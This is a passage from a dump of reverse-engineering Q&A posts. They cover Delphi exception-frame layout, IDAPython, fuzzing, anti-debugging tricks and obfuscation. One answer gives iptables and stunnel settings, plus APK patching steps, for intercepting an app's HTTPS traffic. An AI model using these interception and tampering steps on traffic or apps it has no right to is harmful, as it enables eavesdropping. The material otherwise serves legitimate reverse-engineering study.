<p>Note that the usefulness of IOs will only become greater as time goes one. As seen in <a href=""http://eprint.iacr.org/2013/454.pdf"" rel=""nofollow"">another paper by some of the same authors</a> and hopefully they will become more practical as new constructions are proposed.</p>

<p><strong>Functional Encryption</strong> (contribution 3)<br>
Prior to this work FE has only been possible on small circuits. Using 1 and 2, with some other crypto primitives, the authors were able to build FE on all circuits. That is a very significant result.</p>

<p><strong>What does this mean for Anti-RE</strong><br>
It would appear that by itself, indistinguishability obfuscation means very little for anti-reverse engineering. FE on any circuit, however, could be significant. Here is the reason. FE allows for results of a computation to be in plaintext. Compare this with fully homomorphic encryption (FHE) where results will be encrypted or with Multiparty Comptuation were we require multiple parties (but can have plaintext results). Thus, I could give you a key which would allow you to, say, AES decrypt any data I send to you. You would never know the AES key though. There are techniques that also allow you to <a href=""http://eprint.iacr.org/2013/283.pdf"" rel=""nofollow"">hide the function</a> (not just the inputs).</p>

<p>Imagine if you had the ability to allow someone to compute only a specific function(s) on private data that I send you and still get plaintext results. Furthermore, the function is hidden, so they can't reverse engineer the function. That is the contribution of FE, and FE on any circuit is what this work enables.</p>

<p><strong>Practicality</strong><br>
From what I see in the paper, contribution 1 could be practical for real world use, though I am not completely sure. Multilinear maps are pretty inefficient at the moment, but the construction used here is somewhat simplified. Since 2 uses FHE, it isn't practical yet. Since 3 uses 2 and some other heavy-weight crypto, it is also, not practical at the time.</p>
","2594"
"Why was my memory breakpoint not triggered in OllyDbg?","1659","","<p>I am currently battling this protection on an 32-bit executable. </p>

<p>At some point during it's runtime, the protection gets the address of <code>DbgUiRemoteBreakin</code> and writes a <code>JMP</code> to <code>ExitProcess</code> as an anti-attach technique. I decided to place a memory breakpoint on write(I also tried access) on that location figuring at the very least I'd find out what piece of code alters the code. Upon setting the breakpoint I hit <kbd>F9</kbd> only for my memory bp to never be triggered, I tried multiple times. The code was altered, but my memory bp was not triggered. This is the first time that a memory breakpoint was not triggered for me. I am puzzled as to why this has happened. My only guess is that <code>DbgUiRemoteBreakin</code> is located in <em>ntdll.dll</em> and that is why guard pages don't work there.
There were also instances where I had a crash when I set a memory bp on that function.</p>

<p>However I am hoping somebody has encountered this and can explain more in depth. My ollydbg version is 1.10.</p>
","<p>The most likely reason why your breakpoint didn't get hit is because the protected file removed it.</p>

<p><strong>Edit</strong>: If the breakpoint was hardware-based, then the protected file can use <code>GetThreadContext()</code>, erase the DR entries, <code>SetThreadContext()</code>. If the breakpoint was page-protection-based, then the protected file can use <code>VirtualProtect()</code>.</p>
","6131"
"Delphi Pascal Try..Except..Finally block","1654","","<p>I'm having trouble reverse-engineering a specific Delphi Pascal .exe (old vsn., pre-1995 so probably v.3). From the system calls I understand this is <em>probably</em> a <code>try..except..finally</code> block, but I am at a loss finding the 'normal' route through the code, and what the <code>except</code> and (possibly) <code>finally</code> blocks are.</p>

<p>The assembly looks like this:</p>

<pre><code>782CFC  33 C0                   xor    eax, eax
782CFE  55                      push   ebp
782CFF  68 (782E37)             push   _FINALLY_A_0_782E37
782D04  64 FF 30                push   dword ptr fs:[eax]
782D07  64 89 20                mov    dword ptr fs:[eax], esp

            _try_0_782D0A:
782D0A  8B D3                   mov    edx, ebx
782D0C  8B C6                   mov    eax, esi
782D0E  E8 D1 F3 FF FF          call   ...unrelated...
782D13  8D 56 1C                lea    edx, [esi+1Ch]
.. lots of regular code here ..
.. ending with ..
782E17  8B 18                   mov    ebx, dword ptr [eax]
782E19  FF 53 20                call   dword ptr [ebx+20h]

        finally_1_782E1C:
782E1C  33 C0                   xor    eax, eax
782E1E  5A                      pop    edx
782E1F  59                      pop    ecx
782E20  59                      pop    ecx
782E21  64 89 10                mov    dword ptr fs:[eax], edx
782E24  68 (782E3E)             push   _end_1_782E3E

                @block_L:
782E29  8D 45 F4                lea    eax, [ebp + local_0C]
782E2C  BA 02 00 00 00          mov    edx, 2
782E31  E8 12 E3 F7 FF          call   System.@LStrArrayClr
782E36  C3                      retn

            _FINALLY_A_0_782E37:
782E37  E9 B4 E2 F7 FF          jmp    System.@HandleFinally

            _FINALLY_B_0_782E3C:
782E3C  EB EB                   jmp    @block_L
                ; -------

            _end_1_782E3E:
782E3E  5F                      pop    edi
782E3F  5E                      pop    esi
782E40  5B                      pop    ebx
782E41  8B E5                   mov    esp, ebp
782E43  5D                      pop    ebp
782E44  C3                      retn
</code></pre>

<p>-- this is output from my own disassembler, but I don't think there are errors in it. The labels have been auto-named, but I still cannot follow the 'logic' (if any) from one block to the next. In particular, the bottom half, right before the function epilogue, confuses me.</p>

<p>Are these fragments enough to reconstruct the original <code>try</code>..<code>finally</code> blocks?</p>

<hr>

<p>After reading Igor's answer: yes they are. Consider these flowcharts: left, original before special handling of try/finally blocks, right, afterwards.</p>

<p><img src=""https://i.stack.imgur.com/1B6lK.png"" alt=""flowcharts""></p>

<p>In the original flowchart, I considered every jump from one basic block to another as a <em>link</em>, and the code flow stops at every <code>retn</code>. <code>if</code> (E-(F)-K) and <code>if-else</code> (G-H/I-J) structures can clearly be discerned. However, pushing return addresses and the other 'tricks' of exception handling, defeat this, as can be seen by the dangling blocks N and O -- they 'enter' from nowhere --, and a separate block 'M' which comes and goes from nowhere.</p>

<p>At the right, I separated the <em>initialization</em> of the exception block from the main code (adding a new block B), and concatenated the <em>finalize</em> structure into one single new block (M), which ultimately jumps to an AFTER_TRY (which happened to be the last <em>Exit</em> block). Now it's clear that</p>

<ol>
<li>right after the prologue, a <code>try</code> is initiated;</li>
<li>all code ends up at the <code>finally</code> block M, which</li>
<li>then always exists the code at a single fixed point.</li>
</ol>
","<p>Delphi implements <code>try</code>/<code>except</code>/<code>finally</code> by using Win32 Structured Exception Handlers (SEH). The basics of SEH are explained in the <a href=""http://www.microsoft.com/msj/0197/Exception/Exception.aspx"" rel=""nofollow"">classic article by Matt Pietrek</a>, so I'll skip to the details relevant to Delphi only.</p>

<h1>1. <code>try</code> entry</h1>

<p>Entry to a <code>try</code> block, or a block which protects automatic variables that need to be destructed on exit (such as strings) looks like the following:</p>

<pre><code>xor     eax, eax
push    ebp
push    offset SEH_HANDLER
push    dword ptr fs:[eax]
mov     fs:[eax], esp
</code></pre>

<p>This is a typical way of setting up a SEH frame. After it's run, top of the stack will look like this:</p>

<pre><code>       +-----------+
ESP+00 |    next   | &lt;- fs:[0] points here
       +-----------+
ESP+04 |  handler  |
       +-----------+
ESP+08 | saved_ebp |
       +-----------+
</code></pre>

<p>The pointer to this structure will be passed to the SEH handler.</p>

<h1>2. <code>try</code> exit</h1>

<p>At the end of the <code>try</code> block, the SEH frame is torn down:</p>

<pre><code>    xor     eax, eax
    pop     edx               ; pop 'next' into edx
    pop     ecx               ; pop handler
    pop     ecx               ; pop saved_ebp
    mov     fs:[eax], edx     ; move 'next' into fs:[0]
</code></pre>

<p>If there is a <code>finally</code> handler or automatic destructors, then it continues like this:</p>

<pre><code>    push    offset AFTER_TRY  ; make it so the 'ret' will jump to AFTER_TRY
FINALLY_HANDLER:
    &lt;destruct automatic variables created in the try block&gt;
    &lt;finally handler body&gt;
    ret                       ; jumps to AFTER_TRY
</code></pre>

<p>Otherwise there is a simple jump:</p>

<pre><code>    jmp AFTER_TRY
</code></pre>

<h1>3. <code>finally</code> handler</h1>

<p>In case the program use <code>finally</code> statement, or in case of the <code>try..finally</code> added by the compiler to guard automatic variables, the SEH handler looks like this:</p>

<pre><code>SEH_HANDLER:
    jmp     _HandleFinally
    jmp     FINALLY_HANDLER
</code></pre>

<h1>4. <code>except</code> handler</h1>

<p>If the program uses an <code>except</code> handler to catch all exceptions, the code looks a little different:</p>

<pre><code>SEH_HANDLER:
    jmp     _HandleAnyException
    &lt;handler code&gt;
    call    _DoneExcept
</code></pre>

<h1>5. <code>except on</code> handlers</h1>

<p>If the program uses <code>except on...</code> to match the exception(s) being caught, the compiler generates a table of one or more possible exception classes with corresponding handlers:</p>

<pre><code>SEH_HANDLER:
    jmp     _HandleOnException
    dd &lt;numExceptions&gt;
    dd offset ExceptionClass1
    dd offset OnException1_handler
    dd offset ExceptionClass2
    dd offset OnException2_handler
    &lt;...&gt;

OnException1_handler:
    &lt;handler code&gt;
    call    _DoneExcept

OnException2_handler:
    &lt;handler code&gt;
    call    _DoneExcept
</code></pre>

<p>There may be some variations, but I think I covered most of it.</p>

<p>The source code of <code>_HandleFinally</code>, <code>_HandleAnyException</code>, <code>_HandleOnException</code>, <code>_DoneExcept</code> and a few other exceptions-related functions can be found in <code>system.pas</code> in the VCL sources.</p>
","2896"
"Extracting arguments from IDA","1651","","<p>Let's say I have the following function in IDA:</p>

<pre><code>int __usercall function&lt;eax&gt;(char* message&lt;ebp&gt;, unsigned int count&lt;edi&gt;)
</code></pre>

<p>What's the fastest way to extract the argument information using IDAPython, such that I get the following:</p>

<pre><code>[['char*', 'message', 'ebp'],['unsigned int','count','edi']]
</code></pre>

<p>Not that it also needs to handle situations like:</p>

<pre><code>void *__usercall sub_4508B0@&lt;rax&gt;(void *(__usercall *function)@&lt;rax&gt;(int one@&lt;eax&gt;)@&lt;rax&gt;);
</code></pre>

<p>Which should give me something along the lines of:</p>

<pre><code>[['void * ...', 'function', 'rax']]
</code></pre>
","<p>I received an answer from HexRays support which has a solution which does not rely on parsing the C string retrieved by <code>GetType(ea)</code>.</p>

<p>Let's imagine we start with a function prototype:</p>

<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
</code></pre>

<p>That's from an ELF file, x86 abi; stuff is passed on the stack.</p>

<p>Then, I can do the following:</p>

<pre><code>Python&gt;from idaapi import *
Python&gt;tif = tinfo_t()
Python&gt;get_tinfo2(here(), tif)
True
Python&gt;funcdata = func_type_data_t()
Python&gt;tif.get_func_details(funcdata)
True
Python&gt;funcdata.size()
3
Python&gt;for i in xrange(funcdata.size()):
Python&gt;    print ""Arg %d: %s (of type %s, and of location: %s)"" % (i, funcdata[i].name, print_tinfo('', 0, 0, PRTYPE_1LINE, funcdata[i].type, '', ''), funcdata[i].argloc.atype())
Python&gt;
Arg 0: argc (of type int, and of location: 1)
Arg 1: argv (of type const char **, and of location: 1)
Arg 2: envp (of type const char **, and of location: 1)
</code></pre>

<p>Note that it tells me the location type is <code>1</code>, which corresponds
to 'stack':
<a href=""https://www.hex-rays.com/products/ida/support/sdkdoc/group___a_l_o_c__.html"">https://www.hex-rays.com/products/ida/support/sdkdoc/group___a_l_o_c__.html</a></p>

<p>Now, let's assume I change the prototype to this:</p>

<pre><code>.text:0804ABA1 ; int __usercall main@&lt;eip&gt;(int argc@&lt;eax&gt;, const char **argv@&lt;esp&gt;, const char **envp@&lt;edx&gt;)
</code></pre>

<p>Then:</p>

<pre><code>Python&gt;get_tinfo2(here(), tif)
True
Python&gt;tif.get_func_details(funcdata)
True
Python&gt;for i in xrange(funcdata.size()):
Python&gt;    print ""Arg %d: %s (of type %s, and of location: %s)"" % (i, funcdata[i].name, print_tinfo('', 0, 0, PRTYPE_1LINE, funcdata[i].type, '', ''), funcdata[i].argloc.atype())
Python&gt;
Arg 0: argc (of type int, and of location: 3)
Arg 1: argv (of type const char **, and of location: 3)
Arg 2: envp (of type const char **, and of location: 3)
</code></pre>

<p>Argument location type is <code>3</code> now, which corresponds to 'inside
register'.</p>

<p>(Then, I would have to use <code>reg1()</code> to retrieve the actual
register number to know <em>what</em> register the argument is
passed in)</p>

<p>Credit goes to Arnaud of Hex Rays.</p>
","8876"
"Using Stunnel to packet capture HTTPS connection","1651","","<p>I want to reverse engineer an application using HTTPS to communicate.</p>

<p>I need a tool that performs a man in the middle attack and send it's own SSL certificate to the application, so I can decrypt the HTTPS connection it makes by passing the RSA private key to WireShark.</p>

<p>By the way, I have heard about a tool called <a href=""https://www.stunnel.org/index.html"" rel=""nofollow""><code>stunnel</code></a>, but the documentations  I found about how to configure it just confused me. :|</p>
","<p>If you can make the application use a proxy, check <a href=""http://www.telerik.com/fiddler"" rel=""nofollow"">Fiddler</a>.</p>

<p>I used stunnel recently to do the same with an android application - used the <a href=""http://code.google.com/p/dex2jar"" rel=""nofollow"">dextojar</a> suite to take the application apart, replace the <a href=""https://game.server.com"" rel=""nofollow"">https://game.server.com</a> URL with a <a href=""http://game.server.com"" rel=""nofollow"">http://game.server.com</a> URL in the .dex file, re-create the .dex checksum, re-create and sign the apk, install the apk.</p>

<p>Use this iptables entry on my router:</p>

<pre><code>iptables -t nat -A PREROUTING -i eth0 -p tcp -s 192.168.178.100 -d game.server.com --dport 80 -j DNAT --to 192.168.2.2:80
</code></pre>

<p>where 192.168.178.100 is my android device, and 192.168.2.2 is where i run the stunnel. (Alternativeely, you can probably fiddle with the DNS entries/hosts file of your client to make game.server.com == 192.168.2.2)</p>

<p>Then, use this stunnel.conf:</p>

<pre><code>[game]
client = yes
accept = 80
connect=game.server.com:443
</code></pre>

<p>You could possibly use stunnel if you set up two tunnels if you can't patch the client - one stunnel https server to connect your client to, which forwards to an stunnel http server, which forwards to the real https server, but i've never done that.</p>

<p>The third possibilty is <a href=""http://mitmproxy.org/"" rel=""nofollow"">mitmproxy</a>, which might be even closer to what you need. I gave up on getting it to work on my Centos 5 system, but if you have a newer linux, it might be the easiest way to get what you want.</p>
","5951"
"Replacing common x86 instructions with less known ones","1640","","<p>Is there any kind of software or research or paper which discusses replacement of frequent x86 instructions with ones which are less common and thus less understandable to the attacker (floating point/SSE/Virtualization/undocumented) while still maintaining the functionality?</p>

<p>For example, I wan to replace this</p>

<pre><code>    PUSH EBP
    MOV EBP,ESP
    ...
    PUSH DWORD [0x0BEE]
    PUSH 3
    CALL &lt;check&gt;
    TEST EAX,EAX
    JE &lt;0xabcd&gt;
    PUSH &lt;text1&gt;
    PUSH [EBP+5]
    CALL &lt;MessageBox&gt;
0xabcd:
    PUSH &lt;text2&gt;
    PUSH [EBP+5]
    CALL &lt;MessageBox&gt;
</code></pre>

<p>with this</p>

<pre><code>    AESKEYGENASSIST
    VFMSUBADDPD
    MOVLPS
    PMADDUBSW
    RET
    FLDL2T
    CMPXCHG8B
    AESKEYGENASSIST
    VFMSUBADDPD
    MOVLPS
    CMPXCHG8B
    STOSW
    VMLAUNCH
    etc etc
</code></pre>

<p>while still performing the same operation.</p>
","<p>I do not think code morphism is <em>the</em> or <em>an</em> answer to this question. </p>

<p>What the question was about is obfuscating the algorithm implementation by using less common or undocumented assembly instructions. This can actually be done by some compilers when extensive optimizations are turned on. For example compilers like the <strong>Intel C Compiler</strong>, <strong>GCC</strong>, or <strong>PGI</strong> can autovectorize loops when matched to some internal patterns (<em>reductions</em>, <em>matrix multiplications</em>, ...) and when the target architecture supports vectorization. Other optimizations can lead to extremely tricky assembly code but still, it can always be reversed since the compiler performs no <strong>explicit</strong> obfuscation and because most of what the compiler does is pattern matching. Of course if you associate a high level pattern to a low level one, well, you lose the obfuscation and your code can easily be reversed. Thus techniques as the one you're looking for can only be performed by hand either by writing high level code using compiler intrinsics and alternative constructs or at the assembly level.   </p>

<p>If you are really interested in obfuscation techniques I recommend you going over Jan CAPPAERT's PhD thesis : <a href=""https://www.cosic.esat.kuleuven.be/publications/thesis-199.pdf"">https://www.cosic.esat.kuleuven.be/publications/thesis-199.pdf</a>, it covers some nice techniques used not only on malware but on industrial software too. The bibliography is quite rich.
You can also check this talk given by Sean Taylor at Defcon on how to make the compiler do the obfuscation : <a href=""https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-sean_taylor-binary_obfuscation.pdf"">https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-sean_taylor-binary_obfuscation.pdf</a>.</p>

<p>About polymorphism, it is a nice obfuscation technique though it is rarely used in malware nowadays, and for many reasons. One of them is that few, if none, malware authors write code in assembly anymore, and most use frameworks and engines. You have to keep in mind that writing obfuscated assembly code is an art ... and that now it is used to harden the reverse engineering process for profit not for the challenge.</p>

<p>I've been working on a <strong>GCC</strong> plugin that adds an optimization pass which performs code obfuscation on the IR - internal representation (GIMPLE) - of a code before applying another obfuscation pass at the assembly level. The interesting thing about this approach is that you have the CFG (Control Flow Graph) of the program at compile time, and you can apply many obfuscation algorithms and techniques in order to break it into other equivalent CFGs and then assess which suites best and use it throughout the remaining compilation phases.</p>

<p>Hope my post helps.</p>
","4135"
"State of the Art Fuzzing Framework","1636","","<p>I've previously rolled my own Fuzzing Framework, and tried a few others like Peach Fuzzer.  It's been awhile since I've looked at vulnerability hunting, what is the state of the art with regard to fuzzing?  That is, if I were to start fuzzing Acme Corp's PDF Reader today, what toolset should I look into?  </p>
","<p>There are three types of fuzzers:</p>

<ul>
<li><em>mutation fuzzers</em>, which start with a large list of diverse, good input files and a list of mutations. Then, each file is mutated in some way and passed to the application to see if the app can handle the mutated input. Charlie Miller's 2010 <a href=""http://fuzzinginfo.files.wordpress.com/2012/05/cmiller-csw-2010.pdf"" rel=""nofollow"">CanSecWest talk</a> covers this approach nicely. Generally it's straightforward to roll your own version of a mutation fuzzer for a file format.</li>
<li><em>generative fuzzers</em>, which at their simplest just generate random output. More complex versions will be able to describe protocols and methods for injecting randomness in various fields of the protocols. <a href=""https://github.com/OpenRCE/sulley"" rel=""nofollow"">Sulley</a> is a tool in this class. A particularly nice subclass is <em>grammar-based</em> fuzzers, where you start with a BNF grammar and generate strings by walking the grammar directly.</li>
<li><em>whitebox fuzzers</em> are arguably a different class, where some constraint solver reasons about code paths to generate new inputs for fuzzing. <a href=""https://code.google.com/p/avalanche/"" rel=""nofollow"">avalanche</a> is a publicly available tool for this. (SAGE, the tool that @0xea pointed out, is another example.)</li>
</ul>

<p><a href=""http://securityevaluators.com/files/papers/analysisfuzzing.pdf"" rel=""nofollow"">Another of Miller's papers</a> has a nice overview of the first two. And you should probably see the <a href=""http://www.fuzzing.org/"" rel=""nofollow"">Fuzzing book's website</a>, which has some software you can start with.</p>
","1403"
"Where can I find the 64-bit version of shell32.dll on Windows?","1635","","<p>I'm trying to debug Control Panel and I'd like to disassemble <code>shell32.dll</code>. Because control panel is a 64-bit executable, it loads the 64-bit version of the dll (contrary to the name). When I view the disassembled code in debug mode, I can confirm that it is indeed 64-bit. Ida claims that it's located at <code>C:\WINDOWS\system32\shell32.dll</code>; however this dll is entirely 32-bit. I also checked <code>C:\WINDOWS\SysWOW64\shell32.dll</code>, but it's also 32-bit.</p>

<p>Can someone explain what's going on here?</p>

<p>Thanks!</p>
","<p>What you are seeing is the result of WoW file-system redirection.  The effect occurs when a 32-bit executable requests a copy of a file in the Windows directory.  Since a 64-bit result would probably make no sense to a 32-bit executable, you get the 32-bit copy instead.</p>

<p>If you use Explorer to copy the file from the system32 directory, and then examine the result, you will find that it is a 64-bit executable.</p>
","11214"
"OllyDgb1.10 API help file not working","1634","","<p>I pointed the API help file to <code>WIN32.HLP</code> (Help -> Select API File -> win32.hlp -> Open)</p>

<p>But when I right click on API and click 'Help on Symbolic name' 'Windows Help and Support' comes up and shows me 'Why can't I get Help from this program? '.</p>

<p>What is the problem here...I'm using win 7, 64 Bit.</p>
","<p>(on behalf of the OP)</p>

<p>Solved it. It was because my system was missing one update.</p>

<p>Check the error details and solution <a href=""http://support.microsoft.com/kb/917607"" rel=""nofollow"">here</a>. Modern Windows versions have no more built-in support for the old Windows help format, so that needs to be installed explicitly.</p>
","3755"
"Fixing import table of unpacked DLL with ImpREC : ImpRec throws ""invalid OEP!"" error","1633","","<p>I am trying to unpack a DLL and fix the import tables with ImpRec. However, I am stuck with this error.  Following is what I have tried. </p>

<ol>
<li>Modified the flag in its PE header so that windows loads the file as an exe, not a dll. </li>
<li>Loaded to Immunity Debugger and found the real entry point(Entry point of unpacked binary)</li>
<li>Dumped the the binary at this entry point.</li>
<li>Now I opened ImpREC to fix the import table of the of the dumped DLL. However, in ImpREC the base memory displayed is 7100000. When I give ""068BA2A0"" as entry point, ImpRec complaints invalid OEP!. I dont understand how the base address of the debugged process is ""7100000"". I suspect this could be the problem.</li>
</ol>

<p><img src=""https://i.stack.imgur.com/X3C6W.png"" alt=""enter image description here""></p>

<p>Why is this error? Any pointers to fix it? </p>
","<p>Your analysis machine is Windows 7, ASLR is modifying your module base addresses between different executions. </p>

<p>Try calculating the offset to your OEP (that is, address - base) and using this value to calculate OEP address with the new base (base2 + offset)</p>
","8585"
"What are nullsub_ functions in IDA?","1624","","<p>In nearly every dis-assembly created by IDA, there are several functions that are marked <code>nullsub_</code> which according to IDA, return <del><code>null</code></del> nothing (just <code>ret</code> instruction). </p>

<p>So, what are those and why are they in the database?</p>
","<p><em>I'm answering from a C++ viewpoint, other languages have different reasons.</em></p>

<p>There are legitimate uses for these functions, even if they are nothing more than</p>

<pre><code>void func(/* any args */) {}
</code></pre>

<p>One example that comes to mind is a virtual function that does nothing in a base class but is overridden in a derived class. A similar example would be a template function whose general case is empty but specializations are not.</p>

<p>One more case is static variables. A static variable destructor has to be called at the end of the program, which usually uses <code>atexit</code> to register the destructor callback when the variable is accessed for the first time. As I recall, the C++ standard says that a destructor with no observable behaviour might not be invoked, but I have seen MSVC 6.0 register <code>nullsub</code>s as destructors anyway.</p>

<p>Global variables follow rules similar to static ones.</p>

<p>Another possibility is a function that simply has no effect, <em>according to the compiler</em>. The function has to exist in case something (e.g. another compilation unit that doesn't know the implementation is empty) tries to call it, but its body is empty. <br />
Mind that ""according to the compiler"" is not always equal to the coder's understanding. I myself once wrote a cleanup function that did a lot of work, but by mistake it took the argument by value instead of by reference. The compiler optimized the entire function body to a <code>{}</code> without any warning. Oops.</p>
","2422"
"Debugging NewExecutable binaries","1623","","<p>I'm trying to debug a 16-bit Windows executable (format: New Executable). The problem is that all the standard tools (W32DASM, IDA, Olly) don't seem to support 16-bit debugging.</p>

<p>Can you suggest any win16-debuggers?</p>
","<p><a href=""http://en.wikipedia.org/wiki/Borland_Turbo_Debugger"" rel=""nofollow"">Turbo Debugger</a> has a Windows 3.x version (<code>tdw.exe</code>) that supports NewExecutable files, and works out of the box under Windows XP.</p>
","1894"
"Locating entry point in specific firmware .bin file using IDA Pro","1621","","<p>I am trying to become familiar with IDA by reversing a .bin file that I have compiled myself. The code is written in cpp and the open source code can be found here: <a href=""https://github.com/openxc/vi-firmware"" rel=""nofollow noreferrer"">https://github.com/openxc/vi-firmware</a></p>

<p>Taking a look at the Makefile and linker files (in vi-firmware/src and vi-firmware/src/platform/lpc17xx/), you can see the Flash and RAM locations are called out in the comments. The microcontroller uses an LPC17xx (<a href=""http://vi.openxcplatform.com/electrical/design/microcontroller.html"" rel=""nofollow noreferrer"">http://vi.openxcplatform.com/electrical/design/microcontroller.html</a>) with and ARM 7 architecture.</p>

<p>Therefore, when I load IDA, I select Binary file and set the Processor to ARM and Processor Options to ARM 7. </p>

<p>In the next menu I configure the RAM and ROM according to the comments in vi-firmware/src/platform/lpc17xx/LPC17xx-bootloader.ld and then, after pressing OK, get  the dialogue box telling me to ""Please move to what you think is an entry point"".</p>

<p>I move 64KB (0x10000) into Flash (ROM) and hit 'C' to try to auto-analyse. Only a few lines translate to assembly.</p>

<p>Is there anything else I can do here? I've combed the datasheet for the uC but haven't been able to find anything of use.</p>
","<p><em>(Disclaimer: I do not know ARM, this could be totally wrong)</em></p>

<p>I loaded <code>vi-default-firmware-FORDBOARD-ctv7.2.0.bin</code> (downloaded from the <a href=""https://github.com/openxc/vi-firmware/releases"" rel=""nofollow noreferrer"">releases</a> page) into IDA with these settings:</p>

<p><a href=""https://i.stack.imgur.com/qFivb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/qFivb.png"" alt=""Settings for firmware""></a></p>

<p>Then, after putting the cursor at <code>0x10000</code>, you have to press <kbd>C</kbd>, then scroll to the <em>undefined</em> bytes, then press <kbd>C</kbd> again. Scroll to the top of the function and press <kbd>P</kbd> to make it a function, and have a nice graph view with <kbd>Space</kbd>:</p>

<p><a href=""https://i.stack.imgur.com/dchMU.gif"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dchMU.gif"" alt=""How to fix the code""></a></p>

<p>I don't have any experience with ARM, but this seems like a proper function graph to me:</p>

<p><a href=""https://i.stack.imgur.com/8QV7c.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/8QV7c.png"" alt=""ARM function graph""></a></p>
","14096"
"Finding the actual Thumb code in firmware","1615","","<p>I'm planning to buy my first mechanical keyboard, a KBT Poker II, and apart from the physical characteristics of it, another thing that caught my attention is that it sports reflashable firmware! Reversing and hacking on the firmware would be a fun personal project. (Unfortunately, the flasher is windows-only... I'm not sure how to deal with that, but that's another question.)</p>

<p>Sadly though, when I tried poking around with the firmware files I couldn't make sense of it--I tried running a few Thumb disassemblers (as well as hacking up my own to learn more about Thumb) on parts of it that would seem to contain code (upon hexdump inspection), but they all came up with garbage instruction as far as a I could tell--certainly no function prologues/epilogues, and a lot of crazy immediates all over the place as well as absurd amounts of shifts and LDMs.</p>

<p>Some technical information on the hardware inside the keyboard: it's built around a <a href=""http://www.nuvoton.com/hq/products/microcontrollers/arm-cortex-m0-mcus/nuc120-122-123-220-usb-series/nuc122sc1an/"">Nuvoton NUC122SC1AN</a>, which features a Cortex-M0 CPU.  The firmware files in question are supplied in an attachment to <a href=""http://geekhack.org/index.php?topic=50245.0"">this forum post</a> (by the keyboard manufacturer).</p>

<p>What I <em>have</em> found, however, is the interrupt table located at <code>$0000</code>--its length exactly matches that of the one documented on ARM's website, including IRQs 0..31. However, another oddity here is that they all point to interrupts in the high memory--<code>$ffff_fff00</code> and such.  This area isn't included in the memory map of the NUC122, and ARM's spec has it as ""reserved"", but I'm guessing it might be mapped to some internal memory containing the chip-flashing-receiving code and such, and that the interrupts either trampoline to user (firmware) code or the table gets overwritten with interrupt handlers supplied by the firmware. Anyway, I'd probably be able to figure that out once I have some code to look at.</p>

<p>I've tried binwalking the files, and it came up empty for all of them.</p>

<p>To be clear, <strong>what I'm looking for</strong> in an answer here is guidance to where I find the actual executable code in one of the firmware files above (supplied by the manufacturer itself, so there should be no legal isues here), because I'm really not getting it. I should add that I'm relatively new to the world of reversing.  Thanks!</p>
","<p>I downloaded the archive you referenced and the first thing I noticed was that the firmware files are very heavy in the 0x80 - 0xff range.  Inverting each byte resulted in a much nicer byte distribution and looked like it had some structure but still not quite right.  I assume that since they went as far as inverting the bytes, they might have done some bit-manipulation such as XOR.</p>

<p>Since this file is a firmware update, there is usually a header or a footer.  It looks like there is a header of offsets or something, but nothing made sense.  Scrolling further through the file, around byte 35000, there appears to be a block of structured data, followed by a block of 0xff and then a 16-byte ""footer"":</p>

<pre><code>003F1F0: 84 95 74 64 B4 63 13 14 00 00 00 00 3C DC C5 6C   ..td.c......&lt;...
</code></pre>

<p>The first 8 bytes look like a good place to start.  Going through a few common XOR strategies resulted in nothing.  Then I noticed that these bytes have a low nibble of 3, 4 or 5 which would place them in the printable ASCII range.  So swap the nibbles of each byte (aka rotate left 4 bits) ... :</p>

<pre><code>003F1F0: 48 59 47 46 4B 36 31 41 00 00 00 00 C3 CD 5C C6   HYGFK61A........
</code></pre>

<p>Bingo!  Since the firmware updater window title is ""HY USB Firmware Downloader"", I think this is a winner.  Loading the resulting file into IDA, Cortex M-0 Thumb 2 settings, and sure enough, we have valid code starting at offset 0x0120 and ASCII string block at offset 0x32121.</p>

<p>Summary: Decode the .bin files by processing each byte as:</p>

<pre><code>rotate left 4 bits and invert:  
c = (((c &amp; 0x0f) &lt;&lt; 4) | ((c &amp; 0xf0) &gt;&gt; 4)) ^ 0xff
</code></pre>
","5964"
"What does `jz $+2` do? (jump if zero to dollar plus two)","1610","","<p>What does the dollar symbol mean in</p>

<pre><code>jz $+2
</code></pre>

<p>(This is IDA output.)</p>
","<p>The dollar symbol in this instance means ""current position."" This is the position this instruction begins at, and then plus two bytes. This instruction is two bytes, so it jumps to the next instruction past this one. It's effectively garbage.</p>
","2591"
"How to extract the input file offset of a byte in idapython?","1607","","<p>For every selected byte Ida Pro displays the <em>offset in the input file</em> where the byte can be found (displayed in the buttom bar of the Ida-View and the Hex-View). How can I retrieve this information when using the idapython API?</p>
","<p>When looking for functions, you should always check the SDK headers. These two are listed in <code>loader.hpp</code>:</p>

<pre><code>// Get offset in the input file which corresponds to the given ea
// If the specified ea can't be mapped into the input file offset,
// return -1.    
idaman int32 ida_export get_fileregion_offset(ea_t ea);    

// Get linear address which corresponds to the specified input file offset.
// If can't be found, then return BADADDR    
idaman ea_t ida_export get_fileregion_ea(int32 offset);
</code></pre>

<p>So you can use them from IDAPython like this:</p>

<pre><code>offset = idaapi.get_fileregion_offset(ea)
ea = idaapi.get_fileregion_ea(offset)
</code></pre>

<p>NB: not all SDK functions are exposed in Python. If you absolutely need something which is only available in C API, you can <a href=""http://www.hexblog.com/?p=695"">use <code>ctypes</code> to call it</a>.</p>
","2837"
"What does the `TEST` instruction do","1600","","<p>I'm having trouble understanding the TEST instruction and its use. I'm looking at the following code at the end of a loop</p>

<pre><code>0040A3D1   A9 00010181           TEST EAX,81010100
0040A3D6   74 E8                 JE SHORT JinKu_ke.0040A3C0
</code></pre>

<p>I understand how it works TEST AL,AL or TEXT EAX,EAX,but I do not know how it works with numbers Because the JE instruction does not jump when I use 0x810100FE and also even when we use 0x81010102, but when I use 0x60E0FEFC and below JE instruction jump. </p>
","<h2>1. TEST</h2>

<p>According to the <a href=""http://x86.renejeschke.de/html/file_module_x86_id_315.html"" rel=""noreferrer"">x86 Instruction Set Reference entry for TEST</a> found at <a href=""http://x86.renejeschke.de/"" rel=""noreferrer"">http://x86.renejeschke.de/</a>,</p>

<p><a href=""https://i.stack.imgur.com/uHR2k.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/uHR2k.png"" alt=""TEST""></a></p>

<blockquote>
  <p>[TEST] computes the bit-wise logical AND of first operand (source 1 operand) and the second operand (source 2 operand) and sets the SF, ZF, and PF status flags according to the result. The result is then discarded.</p>
